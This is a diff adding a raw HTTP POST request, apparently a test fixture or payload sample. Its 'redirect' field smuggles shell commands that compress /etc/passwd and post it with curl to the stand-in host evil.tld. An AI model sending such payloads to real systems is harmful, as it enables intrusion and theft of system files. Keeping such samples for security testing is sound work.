@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+Connection: close
+
+redirect=|%0agzip%0a/etc/passwd%0a|%0acurl%0a-X%0aPOST%0a-d%0a@-%0ahttp://evil.tld
